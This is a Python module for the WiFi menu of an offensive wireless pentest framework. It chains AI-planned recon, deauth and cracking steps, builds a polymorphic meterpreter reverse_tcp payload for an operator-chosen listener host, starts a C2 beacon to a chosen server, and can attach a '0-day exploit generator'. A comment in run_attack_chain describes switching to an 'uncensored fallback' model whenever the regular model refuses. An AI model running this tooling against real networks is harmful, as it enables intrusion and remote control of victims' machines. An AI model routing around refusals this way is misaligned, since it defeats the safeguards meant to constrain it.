#!/usr/bin/env python3
"""
WiFi Screen TUI
WiFi operations sub-menu (wifite-style primary flow + Advanced submenu).
Integrates real scanning, CVE mapping, C2 beacon launching, and AI-assisted
attack-plan generation. All actions are curses-free callable (injectable
``input_fn`` / ``thread_runner`` / ``scanner_cls``) for pytest.
"""

import logging
from typing import List, Dict, Any

from core.tui.base_screen import BaseScreen
from core.ai_backend import AIBackend
from core.exploit_knowledge_base import ExploitKnowledgeBase

logger = logging.getLogger(__name__)

class WiFiScreen(BaseScreen):
    def __init__(self, stdscr, parent_callback, activity_log: List[str], **kwargs):
        super().__init__(stdscr, parent_callback, activity_log, **kwargs)
        self.title = "WiFi Operations"

        # Reuse shared instances from the dashboard when provided.
        self.ai_backend = self.ai_backend or AIBackend(
            settings=kwargs.get("settings_manager")
        )
        self.kb = self.kb or ExploitKnowledgeBase()
        # Shared post-exploit runner (real, gated). May be None if init failed.
        self.post_runner = kwargs.get("post_runner")
        self.orchestrator = kwargs.get("orchestrator")
        self.tui_confirm = kwargs.get("tui_confirm")
        # Adaptive WiFi pentest: catalog-recon factory (ungated pre-chain)
        # and external-terminal launcher (for long-running steps in
        # xterm/gnome-terminal/tmux). Both are injected by the dashboard.
        # If the dashboard didn't provide them (older test fixtures, a
        # hand-rolled WiFiScreen), we degrade gracefully -- the recon
        # pass is skipped and steps run in-process.
        self.catalog_recon_factory = kwargs.get("catalog_recon_factory")
        self.external_terminal = kwargs.get("external_terminal")

        self.scan_results: List[Dict[str, Any]] = []
        self.selected_target = None
        self.c2_beacons = []
        self.interface = None  # selected at runtime — never hardcoded
        # Interface mode tracking for the textual-state bug fix. The
        # operator wants the menu item text to reflect the current
        # state ("monitor on wlan0mon" vs "managed on wlan0") and the
        # action to be a TOGGLE on enter/spacebar — not just a re-run
        # of the monitor-on path. ``interface_mode`` is one of:
        #   None      — no iface selected yet
        #   "managed" — selected iface is in managed mode (post-stop)
        #   "monitor" — selected iface is in monitor mode (post-airmon)
        # ``original_iface`` is the pre-airmon managed name (only set
        # when airmon produced a ``wlan[id]mon`` vif).
        self.interface_mode: Optional[str] = None
        self.original_iface: Optional[str] = None
        # mt7921e capability probe result from pick_interface; carried into
        # the chain seed so the planner + orchestrator can branch on it
        # (raw-frame deauth, gated injection steps). None until probed.
        self.adapter_caps = None
        # Per-engagement 0-day generator toggle (Advanced menu). Default
        # off; when True the optional propose→build→execute tail attaches
        # to the chain regardless of the zero_day.attach_to_chain setting.
        self.attach_zero_day = False
        self._post_plan = None  # last computed post-exploit plan
        self._last_report = None

        # ---- wifite-style primary flow ----
        self.primary_items = [
            ("Scan Wireless Networks", self.scan_networks),
            ("Select Target (number keys)", self._select_target_prompt),
            ("Run All Attacks (AI-orchestrated, ACCEPT/CANCEL)", self.run_attack_chain),
            ("Show Report (last engagement)", self.show_report),
            ("List Discovered Devices (airgeddon-style)", self.list_devices),
            ("Advanced…", self._show_advanced),
            ("Back to Main Menu", self.parent_callback),
        ]
        self.advanced_items = [
            ("Pick Wireless Interface (auto-detect + monitor)", self.pick_interface),
            ("Generate Attack Plan (AI only)", self.generate_attack_plan),
            ("Post-Exploit: Plan (AI+KB+MSF)", self.plan_post_exploit),
            ("Post-Exploit: Execute Plan (gated)", self.execute_post_exploit),
            ("Launch Metasploit polymorphic exploit", self.launch_metasploit_exploit),
            ("Establish C2 Beacon (MITRE T1041)", self.establish_c2_beacon),
            ("Show KB Tools for WiFi", self.show_kb_tools),
            ("Fetch WiFi tool repos (clone into toolboxes/)", lambda: self.fetch_domain_repos("wifi")),
            ("Prepare WiFi tools (install deps)", lambda: self.prepare_domain_tools("wifi")),
            ("Toggle 0-day exploit generator on chain (optional)", self.toggle_attach_zero_day),
            ("Back to Primary", self._show_primary),
        ]
        # Initialise the interface-mode label (no iface selected →
        # static "Pick..." label is correct). This anchors the
        # textual-state-bug invariant: every state change goes
        # through ``_rebuild_advanced_items`` so the menu reflects
        # reality.
        self._rebuild_advanced_items()
        self._show_primary()

    # ------------------------------------------------------------------
    # Wifite flow hooks
    # ------------------------------------------------------------------
    def _target_label(self, idx, target):
        return (f"{idx + 1}. {target.get('ssid') or '<hidden>'} "
                f"[{target.get('bssid')}] CH {target.get('channel')} "
                f"{target.get('encryption')}")

    def _on_target_selected(self, idx):
        t = self.selected_target
        self.activity_log.append(
            f"[+] Target #{idx + 1} selected: {t.get('ssid') or '<hidden>'} "
            f"({t.get('bssid')}) — Run All Attacks to engage."
        )

    def show_report(self):
        """Re-emit a summary of the last engagement (curses-free, testable)."""
        self.activity_log.append("=== Last WiFi Engagement Report ===")
        if self.selected_target is not None:
            t = self.selected_target
            self.activity_log.append(
                f"[i] Target: {t.get('ssid') or '<hidden>'} ({t.get('bssid')}) "
                f"CH {t.get('channel')} {t.get('encryption')}"
            )
        else:
            self.activity_log.append("[i] Target: (none selected)")
        self.activity_log.append(f"[i] Interface: {self.interface or 'auto-detect'}")
        self.activity_log.append(f"[i] APs discovered last scan: {len(self.scan_results)}")
        if self._post_plan is not None:
            self.activity_log.append(
                f"[i] Post-exploit plan cached: "
                f"{len(self._post_plan.get('kb_tools') or [])} KB tools, "
                f"{'msf steps' if self._post_plan.get('msf_plan') else 'no msf plan'}."
            )
        self.activity_log.append(
            "[i] Step-by-step output (ACCEPT/CANCEL gated) is in the activity log above."
        )

    def list_devices(self):
        """Airgeddon-style device picker: render the Station MACs gathered
        by the last recon pass as a selectable list and stash the chosen
        MAC on ``self.selected_device_mac`` (and on the selected target so
        the chain targets it for directed deauth / payload / open_shell).
        Requires a prior recon pass; prompts the operator to run one when
        no devices are available. Runs on the curses main thread (the
        attack chain itself runs in a background thread via ``_spawn``)."""
        try:
            from core.tui.device_screen import pick_device, collect_devices
        except Exception as e:
            self.activity_log.append(f"[!] device screen unavailable: {e}")
            return
        recon = getattr(self, "_last_recon", None)
        devices = collect_devices(recon)
        if not devices:
            self.activity_log.append(
                "[i] No devices yet — run the attack chain (recon enumerates "
                "associated clients) then come back here."
            )
            return
        self.activity_log.append(
            f"[+] {len(devices)} device(s) discovered; opening device picker…"
        )
        mac = pick_device(self.stdscr, self.activity_log, devices)
        if mac:
            self.selected_device_mac = mac
            if self.selected_target is not None:
                self.selected_target["device_mac"] = mac
            self.activity_log.append(
                f"[+] Device {mac} staged for targeted deauth / payload / shell "
                f"(action is ACCEPT-gated at run time)."
            )

    # ------------------------------------------------------------------
    # Primary-flow actions
    # ------------------------------------------------------------------
    def run_attack_chain(self):
        """Run the catalog-driven recon pass (ungated) followed by the
        AI-orchestrated WiFi attack chain (per-step ACCEPT/CANCEL).

        The recon pass runs first: it probes WPS, enumerates clients,
        looks up CVEs from NVD, generates a weakpass wordlist, searches
        the knowledge base, and walks the catalog for the target's
        toolset. The recon results are persisted to
        ``logs/recon/<bssid>_<ts>.json``.

        Once recon is done, the gated attack chain runs. The AI
        orchestrator walks the steps; long-running steps (airodump,
        deauth, hashcat, evil-twin, msfconsole) spawn in the
        operator's external terminal of choice (xterm/gnome-terminal
        /tmux) so live logs are visible.
        """
        if not self.selected_target:
            self.activity_log.append("[!] Select a target first (Scan → number key).")
            return
        if not self.orchestrator:
            self.activity_log.append("[!] Orchestrator unavailable.")
            return
        self.orchestrator.interface = self.interface
        target = dict(self.selected_target)
        target.setdefault("interface", self.interface)

        def run():
            try:
                # UNGATED: catalog-driven recon pass.
                recon_report = None
                if self.catalog_recon_factory is not None:
                    try:
                        self.activity_log.append(
                            f"[*] Running catalog recon on "
                            f"{target.get('ssid') or '<hidden>'} "
                            f"({target.get('bssid') or 'no-bssid'})"
                        )
                        recon = self.catalog_recon_factory(target)
                        recon_report = recon.run(with_probes=True)
                        self._last_recon = recon_report
                        # Per-step lines for the operator.
                        for k in ("wps", "clients", "cves", "weakpass",
                                  "kb_hits", "catalog_runs",
                                  "probe_profile", "hidden_ssid",
                                  "signal_map", "handshake_harvest",
                                  "eapol_monitor", "channel_plan",
                                  "deauth_detect", "gps_wardrive",
                                  "beacon_parse"):
                            s = recon_report.get(k) or {}
                            if not s:
                                continue
                            mark = "+" if s.get("ok") else "!"
                            self.activity_log.append(
                                f"[recon] {mark} {k}: {s.get('error') or 'ok'} "
                                f"({s.get('duration_s', 0):.1f}s)"
                            )
                        self.activity_log.append(
                            f"[+] recon done: wps={recon_report['wps'].get('data',{}).get('enabled','?')}, "
                            f"clients={recon_report['clients'].get('data',{}).get('count','?')}, "
                            f"cves={recon_report['cves'].get('data',{}).get('count','?')}, "
                            f"kb_hits={recon_report['kb_hits'].get('data',{}).get('count','?')}"
                        )
                    except Exception as e:
                        self.activity_log.append(
                            f"[!] recon pass failed (continuing to attack): {e}"
                        )
                else:
                    self.activity_log.append(
                        "[i] No catalog-recon factory injected -- skipping recon pass."
                    )

                # Merge recon into the seed so the chain planner attacks
                # the *selected target's* real CVEs (not a generic tool
                # list). Vendor + normalized CVE list + per-target KB
                # hits + the full recon dict (the 0-day build dispatcher
                # merges concept.recon_context with live recon). Guard
                # each lookup — recon can partially fail and must never
                # break the chain.
                if recon_report:
                    try:
                        target["vendor"] = (
                            recon_report.get("vendor") or target.get("vendor")
                        )
                        cves_step = recon_report.get("cves", {}) or {}
                        target["cves"] = (
                            (cves_step.get("data", {}) or {}).get("cves", [])
                            or []
                        )
                        kb_step = recon_report.get("kb_hits", {}) or {}
                        target["kb_hits"] = (
                            (kb_step.get("data", {}) or {}).get("hits", [])
                            or []
                        )
                        target["recon"] = recon_report
                    except Exception as e:
                        self.activity_log.append(
                            f"[i] recon-merge skipped: {e}"
                        )

                # Carry the mt7921e adapter capability probe (Part 5) onto
                # the seed so the planner + orchestrator can branch on
                # it (raw-frame deauth, gated injection steps). Falls
                # back to a non-mt7921e marker when no probe ran.
                target["adapter_caps"] = (
                    self.adapter_caps or {"mt7921e": False}
                )

                # GATED: existing attack chain. New `use_ai_chain=True`
                # routes through AIChainPlanner + uncensored fallback
                # when the per-domain model refuses; back-compat with
                # the legacy hardcoded ladder is preserved. The
                # per-engagement ``attach_zero_day`` flag (Advanced-menu
                # toggle) overrides the settings-based default so the
                # operator can attach the optional 0-day tail per chain.
                self.orchestrator.run(
                    "wifi", target,
                    use_ai_chain=True,
                    attach_zero_day=self.attach_zero_day,
                )
                self._last_report = {"domain": "wifi", "target": target,
                                     "recon": recon_report}
            except Exception as e:
                self.activity_log.append(f"[!] attack chain error: {e}")

        self._spawn(run)

    def pick_interface(self):
        """Detect wireless adapters, let the operator pick one, then put it
        into monitor mode automatically.

        Monitor mode is engaged via ``sudo airmon-ng start <iface>`` (the
        operator-visible adapter-selection path) so we end up with the
        conventional ``wlan[id]mon`` vif name; the original iface is left
        in managed mode and both names are recorded on the shared
        dashboard tracker so the quit path tears the vif down with
        ``sudo airmon-ng stop``. Falls back to an in-place iw+ip flip
        only when ``airmon-ng`` is not installed. After monitor mode
        succeeds (either path), an mt7921e capability probe runs the
        runtime injection test and stores the result on
        ``self.adapter_caps`` for the chain planner.

        On success, sets ``self.interface_mode = "monitor"`` and
        ``self.original_iface = <pre-airmon name>`` so the menu item
        text reflects the new state and the next enter/spacebar
        triggers :meth:`toggle_interface_mode` (back to managed)
        rather than re-running monitor mode.
        """
        try:
            from core.tui.interface_picker import pick_wireless_interface
        except Exception as e:
            self.activity_log.append(f"[!] interface picker unavailable: {e}")
            return
        iface = pick_wireless_interface(self.stdscr, self.activity_log)
        if not iface:
            self.activity_log.append("[i] No interface selected.")
            return

        self.interface = iface
        self.activity_log.append(f"[+] Selected interface: {iface}")

        # Auto-enable monitor mode immediately via sudo airmon-ng start.
        self.activity_log.append(f"[*] Engaging monitor mode on {iface}...")
        mon_ok = False
        try:
            from core.utils.airmon import airmon_start
            mon = airmon_start(iface)
        except Exception as e:
            self.activity_log.append(f"[!] monitor-mode error: {e}")
            mon = {"ok": False, "error": f"airmon_start: {e}"}

        if mon.get("ok"):
            mon_iface = mon.get("monitor_iface") or iface
            self.interface = mon_iface
            method = mon.get("method", "airmon")
            via = ("sudo airmon-ng start" if method == "airmon"
                   else "iw dev set type monitor (flip)")
            self.activity_log.append(
                f"[+] Monitor mode ACTIVE on {self.interface} "
                f"(via {via} {iface})"
            )
            if mon_iface != iface:
                self.activity_log.append(
                    f"[i] Original interface {iface} left in managed mode."
                )
            # Record the iface pair on the shared dashboard tracker so
            # the quit path can run `sudo airmon-ng stop wlan[id]mon`.
            # self.dashboard is the KfiosaDashboard ref (passed in via
            # _shared_kwargs); guard for older fixtures without it.
            dashboard = getattr(self, "dashboard", None)
            if dashboard is not None:
                try:
                    dashboard.monitor_iface = mon_iface
                    dashboard.original_iface = iface
                except Exception:
                    pass
            mon_ok = True
        elif mon.get("error") == "airmon-ng not installed":
            # Fallback: in-place iw+ip flip via the scanner path. Keeps
            # the chain usable on boxes without airmon-ng installed.
            self.activity_log.append(
                f"[i] airmon-ng not installed — falling back to iw+ip "
                f"monitor flip on {iface}."
            )
            try:
                from core.scanners.wifi_scanner import WiFiScanner
                _sc = WiFiScanner(interface=iface)
                _sc.initialize()
                fb = _sc.ensure_monitor(iface)
                if fb.get("ok"):
                    mon_iface = fb.get("interface", iface)
                    self.interface = mon_iface
                    self.activity_log.append(
                        f"[+] Monitor mode ACTIVE on {self.interface} "
                        f"(iw fallback)"
                    )
                    mon_ok = True
                else:
                    self.activity_log.append(
                        f"[!] Monitor mode failed on {iface}: "
                        f"{fb.get('error')} (scan will retry; needs root)"
                    )
                    self._append_monitor_remediation(iface)
            except Exception as e:
                self.activity_log.append(f"[!] monitor-mode error: {e}")
                self._append_monitor_remediation(iface)
        else:
            self.activity_log.append(
                f"[!] Monitor mode failed on {iface}: {mon.get('error')} "
                f"(scan will retry; needs root)"
            )
            self._append_monitor_remediation(iface)

        # mt7921e capability probe — runs after monitor mode succeeds
        # (either airmon or iw fallback). Surfaces injection capability
        # + quality to the operator and stores a compact caps dict on
        # self.adapter_caps for the chain planner to branch on. No-op
        # (caps absent) when the adapter is not mt7921e; every other path
        # is unchanged.
        self.adapter_caps = None
        if mon_ok:
            try:
                from core.modules import mt7921e_tools
                adapters = mt7921e_tools.probe_mt7921e_capabilities(
                    iface=self.interface, test=True,
                    bssid="FF:FF:FF:FF:FF:FF",
                )
                if adapters:
                    a = adapters[0]
                    self.adapter_caps = {
                        "mt7921e": True,
                        "driver": a.driver,
                        "injection_capable": bool(a.injection_capable_runtime),
                        "quality": a.injection_quality,
                        "monitor_iface": self.interface,
                        "original_iface": iface,
                    }
                    self.activity_log.append(
                        f"[+] mt7921e adapter {self.interface}: injection "
                        f"{'OK' if a.injection_capable_runtime else 'FAIL'} "
                        f"(quality={a.injection_quality})"
                    )
                else:
                    self.adapter_caps = {
                        "mt7921e": False,
                        "monitor_iface": self.interface,
                        "original_iface": iface,
                    }
            except Exception as e:
                self.activity_log.append(f"[i] mt7921e probe skipped: {e}")
                self.adapter_caps = {
                    "mt7921e": False,
                    "monitor_iface": self.interface,
                    "original_iface": iface,
                }

        # State tracking for the textual-state bug fix. After monitor
        # mode succeeds, record the mode + the pre-airmon managed name
        # (only when airmon produced a separate vif). On any failure
        # the mode stays None — the operator can re-pick. The next
        # enter/spacebar on the Advanced menu will route to
        # ``toggle_interface_mode`` (which sees "monitor" and flips
        # back to managed) instead of re-running monitor-on.
        if mon_ok:
            self.interface_mode = "monitor"
            # ``iface`` here is the pre-airmon name; ``self.interface``
            # is the post-airmon monitor vif (or the same name if iw
            # fallback kept it). Only set ``original_iface`` when the
            # two differ.
            if self.interface and self.interface != iface:
                self.original_iface = iface
            else:
                # iw-fallback case: in-place flip, same name. There is
                # no "original" managed name to flip back to without
                # operator intervention. We mark it as None and the
                # toggle will fall back to a "stop" via WiFiScanner.
                self.original_iface = None
            # Rebuild the Advanced items so the menu label reflects
            # the new state ("...currently monitor on wlan0mon").
            self._rebuild_advanced_items()

    def _append_monitor_remediation(self, iface: str):
        """Append the standard monitor-mode remediation to the activity log.

        Mirrors the message format from
        :class:`core.utils.wifi_iface.MonitorModeRequired` so the operator
        sees the same commands whether they hit the error in the TUI
        or in the AI engine.
        """
        commands = [
            f"sudo airmon-ng start {iface}",
            f"sudo ip link set {iface} down && "
            f"sudo iw dev {iface} set type monitor && "
            f"sudo ip link set {iface} up",
        ]
        self.activity_log.append(
            f"[!] Run one of these in a root terminal:\n  "
            f"{commands[0]}\n  {commands[1]}"
        )

    def toggle_interface_mode(self):
        """Toggle the current interface between managed and monitor.

        The operator wants the menu item to behave as a TOGGLE on
        enter/spacebar:

          - No iface selected yet (or last attempt failed) → call
            :meth:`pick_interface` (initial monitor engage).
          - Currently in monitor mode → call
            :func:`core.utils.airmon.airmon_stop` (back to managed) on
            the monitor vif, then point ``self.interface`` at the
            original managed name and flip ``interface_mode`` to
            "managed". For the iw-fallback case (in-place flip, no
            separate vif), use :meth:`WiFiScanner.ensure_managed`.
          - Currently in managed mode → re-engage monitor via
            :meth:`pick_interface` (which will reuse the
            ``original_iface`` as the input).

        Each branch appends an honest activity-log line; failures
        degrade with the standard remediation. Never raises.
        """
        if not self.interface:
            self.activity_log.append(
                "[i] No interface selected — picking one now."
            )
            self.pick_interface()
            return

        cur = self.interface_mode
        if cur == "monitor":
            # Flip back to managed. Two paths: airmon-ng (when a
            # separate ``wlan[id]mon`` vif was created) or iw-fallback
            # (in-place flip, same name). airmon_stop handles both:
            # it tears down the vif when there is one, else falls
            # back to the iw+ip flip via WiFiScanner.
            self.activity_log.append(
                f"[*] Tearing down monitor mode on {self.interface}..."
            )
            try:
                from core.utils.airmon import airmon_stop
                res = airmon_stop(self.interface)
            except Exception as e:  # noqa: BLE001
                self.activity_log.append(
                    f"[!] airmon_stop import/call failed: {e}"
                )
                res = {"ok": False, "error": f"airmon_stop: {e}"}
            if not res.get("ok"):
                # Fallback: iw+ip managed flip via the scanner.
                try:
                    from core.scanners.wifi_scanner import WiFiScanner
                    target = self.original_iface or self.interface
                    _sc = WiFiScanner(interface=target)
                    _sc.initialize()
                    _sc.restore_managed(target)
                    # restore_managed is fire-and-forget (no return
                    # value); we assume the iw+ip flip succeeded when
                    # we get here — a verification probe would add
                    # latency to a hot path. The next scan will fail
                    # honestly if the flip did not take.
                    self.interface = target
                    self.activity_log.append(
                        f"[i] Managed flip via iw+ip on {target} "
                        f"(no verification probe; next scan is the "
                        f"ground truth)"
                    )
                except Exception as e:  # noqa: BLE001
                    self.activity_log.append(
                        f"[!] managed-mode flip exception: {e}"
                    )
                    self._append_monitor_remediation(
                        self.original_iface or self.interface
                    )
                    return
            else:
                # airmon_stop succeeded. ``managed_iface`` is the
                # post-stop managed name; fall back to
                # ``original_iface`` (which the caller already has).
                self.interface = (
                    res.get("managed_iface")
                    or self.original_iface
                    or self.interface
                )
            # Update the dashboard tracker (mirror the pick path).
            dashboard = getattr(self, "dashboard", None)
            if dashboard is not None:
                try:
                    dashboard.monitor_iface = None
                    dashboard.original_iface = self.interface
                except Exception:  # noqa: BLE001
                    pass
            self.interface_mode = "managed"
            self.activity_log.append(
                f"[+] Managed mode ACTIVE on {self.interface}"
            )
            self._rebuild_advanced_items()
            return

        if cur == "managed":
            # Currently managed — re-engage monitor on the same
            # original iface. ``pick_interface`` will re-prompt for
            # an iface (the operator may want to switch); we keep
            # the simple semantics and let the operator pick.
            self.activity_log.append(
                f"[*] Re-engaging monitor mode (was managed on "
                f"{self.interface})..."
            )
            self.pick_interface()
            return

        # interface_mode is None (an iface is set but no mode was
        # recorded — legacy fixture or a partially-completed
        # engagement). Treat as "managed" and re-engage monitor.
        self.activity_log.append(
            f"[*] Interface {self.interface} mode unknown; "
            f"re-engaging monitor."
        )
        self.pick_interface()

    def _iface_label(self) -> str:
        """Return the dynamic text for the Advanced menu item.

        Reflects the current state so the operator can tell from the
        TUI which mode the iface is in:
          - no iface:        "Pick Wireless Interface (auto-detect + monitor)"
          - managed:         "Toggle interface: {iface} → MONITOR (currently managed)"
          - monitor:         "Toggle interface: {iface} → MANAGED (currently monitor)"
        """
        if not self.interface:
            return "Pick Wireless Interface (auto-detect + monitor)"
        if self.interface_mode == "monitor":
            return (
                f"Toggle interface: {self.interface} → MANAGED "
                f"(currently monitor)"
            )
        # managed or unknown mode
        return (
            f"Toggle interface: {self.interface} → MONITOR "
            f"(currently managed)"
        )

    def _rebuild_advanced_items(self) -> None:
        """Rebuild :attr:`advanced_items` with the current dynamic
        interface-mode label and route the first item to the
        :meth:`toggle_interface_mode` entry point (which decides
        between :meth:`pick_interface` and the stop path).

        Updates ``self.menu_items`` when the advanced menu is the
        active view so the operator sees the new label immediately
        — the textual-state bug fix's central invariant.
        """
        new_items = [(self._iface_label(), self.toggle_interface_mode)]
        # Copy the rest of the items verbatim (the label, not the
        # callable, is what changes).
        for label, fn in self.advanced_items[1:]:
            new_items.append((label, fn))
        self.advanced_items = new_items
        # If the operator is currently on the advanced menu, refresh
        # the live menu_items list so the new label is shown.
        if getattr(self, "flow_state", None) == "advanced":
            self.menu_items = list(self.advanced_items)

    def toggle_attach_zero_day(self):
        """Flip the per-engagement 0-day generator toggle.

        When ON, the next ``run_attack_chain`` passes
        ``attach_zero_day=True`` to the orchestrator so the optional
        propose→build→execute tail attaches to the chain regardless of
        the ``zero_day.attach_to_chain`` setting. Default OFF; the
        operator opts in per engagement.
        """
        self.attach_zero_day = not self.attach_zero_day
        self.activity_log.append(
            f"[+] 0-day exploit generator on chain: "
            f"{'ON (optional)' if self.attach_zero_day else 'OFF'}"
        )

    def scan_networks(self):
        """Perform a real background WiFi scan (no fake APs). On success,
        populate ``self.targets`` and enter the numbered-targets view."""
        if not getattr(self, "interface", None):
            self.activity_log.append(
                "[!] No interface selected — pick one first "
                "(Advanced → Pick Interface)."
            )
            return
        self.activity_log.append(
            f"[*] Starting WiFi scan on {self.interface} (10s timeout)..."
        )

        def run_scan():
            try:
                scanner_cls = self.scanner_cls
                if scanner_cls is not None:
                    scanner = scanner_cls()
                else:
                    from core.scanners.enhanced_wifi_scanner import EnhancedWiFiScanner
                    scanner = EnhancedWiFiScanner()
                if hasattr(scanner, "initialize"):
                    scanner.initialize()

                self.activity_log.append("[*] Scanning wireless frequencies...")
                scan_data = scanner.scan(self.interface, timeout=10)
                networks = scan_data.get("networks", [])
                error = scan_data.get("error")

                if error:
                    self.activity_log.append(f"[!] Scan error: {error}")
                if not networks:
                    # No fake targets — report honestly.
                    if not error:
                        self.activity_log.append(
                            "[i] No networks discovered on this interface."
                        )
                    self.scan_results = []
                    self.targets = []
                    return

                self.scan_results = networks
                self.targets = list(networks)
                self.activity_log.append(
                    f"[+] WiFi scan completed: {len(self.scan_results)} APs found"
                )
                for net in self.scan_results:
                    self.activity_log.append(
                        f"[i] SSID: {net.get('ssid')} | BSSID: {net.get('bssid')} "
                        f"| CH: {net.get('channel')} | Enc: {net.get('encryption')}"
                    )
                # Enter the wifite numbered-target view.
                self._enter_targets_view()
            except Exception as e:
                logger.error(f"WiFi scan error: {e}")
                self.activity_log.append(f"[!] Scan error: {e}")
                self.scan_results = []
                self.targets = []

        self._spawn(run_scan)

    # ------------------------------------------------------------------
    # Advanced actions
    # ------------------------------------------------------------------
    def generate_attack_plan(self):
        """Invoke AI backend to recommend attack strategy for the selected AP."""
        if not self.selected_target:
            self.activity_log.append("[!] Please select a target first.")
            return

        self.activity_log.append(f"[*] Querying AI for target {self.selected_target.get('ssid')}...")

        # Retrieve relevant exploit repos from knowledge base
        cves = self.kb.search(self.selected_target.get("encryption"), limit=3)
        context = {
            "target": self.selected_target,
            "matching_exploits": [c.get("repo_name") for c in cves]
        }

        def run_ai():
            prompt = f"Recommend a detailed, step-by-step wireless penetration testing methodology for target AP with SSID {self.selected_target.get('ssid')}, encryption {self.selected_target.get('encryption')}, channel {self.selected_target.get('channel')}, and vendor {self.selected_target.get('vendor')}."
            ai_plan = self.ai_backend.query("wifi", prompt, context)

            self.activity_log.append("=== AI Wireless Attack Plan ===")
            for line in ai_plan.split("\n"):
                if line.strip():
                    self.activity_log.append(line)

        self._spawn(run_ai)

    def plan_post_exploit(self):
        """Build a real AI plan + KB tools (+ optional MSF plan). No execution.

        MSF execution needs a REAL live session (a meterpreter foothold from
        a real exploit). The operator is prompted for the session id; if none
        is given, only the AI/KB plan is produced (no synthetic session).
        """
        if not self.selected_target:
            self.activity_log.append("[!] Select a target first.")
            return
        if not self.post_runner:
            self.activity_log.append("[!] Post-exploit runner unavailable.")
            return
        session_id = self.get_input("Live MSF session id (blank = plan only, no execution)")
        session = None
        if session_id and session_id.strip():
            session = {"id": session_id.strip(), "os": "linux", "type": "post"}
        self.activity_log.append("[*] Planning post-exploit (AI + KB + MSF)...")
        target = dict(self.selected_target)
        target.setdefault("interface", self.interface)

        def run():
            plan = self.post_runner.plan("wifi", target, session=session)
            self._post_plan = plan
            if plan.get("error") and not plan.get("ai_plan"):
                self.activity_log.append(f"[!] {plan['error']}")
            if plan.get("ai_plan"):
                self.activity_log.append("=== AI Post-Exploit Plan ===")
                for line in plan["ai_plan"].splitlines():
                    if line.strip():
                        self.activity_log.append(line)
            if plan.get("kb_tools"):
                self.activity_log.append(
                    f"[i] KB tools ({len(plan['kb_tools'])}): "
                    + ", ".join(t.get("repo_name", "") for t in plan["kb_tools"][:6])
                )
            if plan.get("msf_plan") and plan["msf_plan"].get("steps"):
                self.activity_log.append(
                    f"[+] MSF plan: {len(plan['msf_plan']['steps'])} steps "
                    "(execute via Advanced → Post-Exploit Execute)."
                )
            else:
                self.activity_log.append(
                    "[i] No executable MSF steps (provide a real live session id "
                    "to build gated msf steps)."
                )

        self._spawn(run)

    def execute_post_exploit(self):
        """Execute the last MSF plan step-by-step, each gated (default-deny)."""
        if not self.post_runner:
            self.activity_log.append("[!] Post-exploit runner unavailable.")
            return
        if not self._post_plan or not self._post_plan.get("msf_plan"):
            self.activity_log.append(
                "[!] No MSF plan to execute — run 'Post-Exploit Plan' first "
                "(requires a session)."
            )
            return
        self.activity_log.append("[*] Executing MSF plan — each step prompts ACCEPT/CANCEL...")

        def run():
            results = self.post_runner.execute(self._post_plan)
            for r in results:
                self.activity_log.append(f"[i] step: {r}")

        self._spawn(run)

    def show_kb_tools(self):
        """Surface relevant WiFi/exploit repos from the knowledge base."""
        if not self.kb:
            self.activity_log.append("[!] KB unavailable.")
            return
        tools = self.kb.get_tools_for_domain("wifi")
        self.activity_log.append(f"[+] KB WiFi tools ({len(tools)}):")
        for t in tools[:15]:
            self.render_kb_tool(t)

    def launch_metasploit_exploit(self):
        """Generate a polymorphic payload via the real, gated MSF driver."""
        if not self.selected_target:
            self.activity_log.append("[!] Please select a target first.")
            return
        if not self.post_runner:
            self.activity_log.append("[!] Post-exploit runner unavailable.")
            return

        lhost = self.get_input("Listener LHOST (e.g. 10.0.0.5)") or "127.0.0.1"
        lport = self.get_input("Listener LPORT (e.g. 4444)") or "4444"
        self.activity_log.append(
            f"[*] Generating polymorphic payload (lhost={lhost} lport={lport})..."
        )

        def run():
            try:
                res = self.post_runner.generate_payload(
                    "windows/meterpreter/reverse_tcp", lhost, int(lport),
                    encoder="x86/shikata_ga_nai", iterations=5, fmt="raw",
                    use_polymorphic=True,
                )
                if res.get("error"):
                    self.activity_log.append(f"[!] {res['error']}")
                    return
                self.activity_log.append(
                    f"[+] Base payload: {res.get('base_len', 0)} raw bytes "
                    f"(encoder={res.get('encoder')}, iters={res.get('iterations')})."
                )
                if res.get("mutated") is not None:
                    self.activity_log.append(
                        f"[+] Polymorphic mutation: {len(res['mutated'])} bytes "
                        f"(techniques: {', '.join(res.get('techniques') or [])})."
                    )
            except Exception as e:
                logger.error(f"payload gen error: {e}")
                self.activity_log.append(f"[!] Payload generation failed: {e}")

        self._spawn(run)

    def establish_c2_beacon(self):
        """Establish a real lab C2 beacon (authorized-lab only), gated."""
        if not self.tui_confirm:
            self.activity_log.append("[!] ACCEPT/CANCEL gate unavailable.")
            return
        server = self.get_input("C2 server host (e.g. 127.0.0.1)") or "127.0.0.1"
        port = self.get_input("C2 server port (e.g. 8443)") or "8443"
        try:
            port_i = int(port)
        except ValueError:
            self.activity_log.append(f"[!] Invalid port: {port}")
            return
        self.activity_log.append(
            f"[*] Establishing lab C2 beacon -> {server}:{port_i} (each step gated)..."
        )

        def run():
            try:
                from core.c2.lab_beacon import LabBeacon
                beacon = LabBeacon(server=server, port=port_i, protocol="http",
                                   confirm_fn=self.tui_confirm.confirm)
                reg = beacon.register()
                if reg.get("error") or reg.get("status"):
                    self.activity_log.append(
                        f"[!] Beacon register: {reg.get('error') or reg.get('status')}"
                    )
                    return
                self.activity_log.append(
                    f"[+] Beacon registered (id={beacon.beacon_id}); polling for tasks."
                )
                beacon.run(on_task=lambda t: self.activity_log.append(
                    f"[+] Beacon task received: {t}"))
            except Exception as e:
                logger.error(f"c2 beacon error: {e}")
                self.activity_log.append(f"[!] C2 beacon failed: {e}")

        self._spawn(run)